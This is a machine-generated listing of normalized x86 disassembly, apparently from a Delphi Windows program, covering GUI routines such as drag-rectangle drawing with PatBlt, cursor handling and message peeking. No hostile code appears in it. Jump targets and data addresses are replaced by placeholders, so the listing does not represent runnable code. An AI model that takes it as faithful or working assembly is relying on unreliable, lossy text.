push sub_44af98
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4497c4
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_44af98
mov edx [ eax + 0x14 ]
mov eax esi
call sub_4497c4
mov eax [ ebx + 0x14 ]
call sub_40321c
mov eax edi
call sub_40321c
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_44aa04
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_445bbc
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407f98
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_449438
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_445b28
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_449438
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_44ae20
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_44af98
xor edx edx
mov eax edi
call sub_4497c4
sub_44aae0
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_449410
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_4029ec
mov edx eax
mov eax ebx
call sub_449438
sub_44ab1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40441c
xor eax eax
push ebp
push sub_44ab87
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40422c
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ab8e
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_44ab94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44ac43
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4491a0
mov eax [ ebp - 0x8 ]
call sub_44ab1c
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_44ab94
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ac4a
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_44ab94
pop ecx
sub_44ac50
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44ad89
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44ad38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_445b28
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ad3f
mov eax [ ebp - 0x10 ]
call sub_40321c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_44ab1c
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_445b3c
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_44ad3f
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_44ab94
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ad90
lea eax [ ebp - 0x14 ]
call sub_403f6c
retn
sub_44ad98
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4494e8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_449510
call sub_44ad98
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4494e8
call sub_44ad98
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_448f18
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_449410
mov edx eax
mov eax ebx
call sub_449438
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_449438
jmp r-xdata
sub_44ae20
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_44ad98
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_44ae64
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_449410
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_449438
sub_44ae94
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_4470c4
mov edx eax
mov eax [ rw-data ]
call sub_44b9f4
mov eax [ ebx + 0x14 ]
call sub_4470c4
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_44afa8
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44aef4
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_44b9f4
mov eax ebx
call sub_44afa8
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_449438
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_449438
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_44ae20
push ebx
push sub_44af98
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_4497c4
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_44af70
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_445b28
test eax eax
jle r-xdata
push ebx
push sub_44af98
xor edx edx
mov eax ebx
call sub_4497c4
sub_44afa8
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_448fdc
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_448fdc
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_449048
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_449048
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_4236b8
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_44b094
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44b094
pop ecx
mov eax ebx
call sub_449410
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_449410
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44b094
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_449410
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42a43c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_44b124
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_449410
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_448f94
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_449410
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_44b094
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44b174
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_440244
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_440244
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_44b1f0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_448ea0
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_448f4c
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_4494f4
test eax eax
je r-xdata
mov eax esi
call sub_448f18
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44af98
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_4497c4
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4494f4
mov edx [ ebx + 0x20 ]
call sub_44944c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_44b1f0
pop ecx
sub_44b270
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_448efc
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_448efc
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_4494f4
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_44b270
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44af98
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_4497c4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_4490f8
mov eax edi
call sub_4494e8
test eax eax
je r-xdata
mov eax edi
call sub_4494f4
mov esi eax
mov eax esi
call sub_449410
push eax
mov eax esi
call sub_448f4c
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_4494e8
call sub_449410
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_449410
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_449438
mov eax esi
call sub_449410
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_449438
mov eax edi
call sub_4494f4
call sub_449488
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_448f4c
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_449438
mov eax edi
call sub_4494e8
call sub_449488
mov bl 0x1
jmp r-xdata
sub_44b3a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44975c
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_418d40
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_449f50
test eax eax
je r-xdata
push ebp
call sub_44b1f0
pop ecx
push ebp
call sub_44b270
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_44b174
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_44b430
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_448fdc
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_448fdc
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_44b124
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_44b124
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_44b4c0
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44b898
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406cd4
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_449f50
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44aef4
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cd4
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_449f50
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4403e8
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b89f
lea eax [ ebp - 0x48 ]
call sub_403f6c
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4470c4
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_43f104
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_4415a4
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f6c
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_44b3a8
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_445bbc
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_44afa8
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406cd4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_44b430
pop ecx
mov eax [ ebp - 0x4 ]
call sub_44afa8
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cd4
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_449f50
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_4407c4
jmp r-xdata
mov eax edi
call sub_45cce4
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_449f50
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_440244
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_4408a4
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403fc0
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44ae94
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e3e4
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4470c4
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_440f4c
jmp r-xdata
sub_44b8a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031ec
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403540
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_44ba1c
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
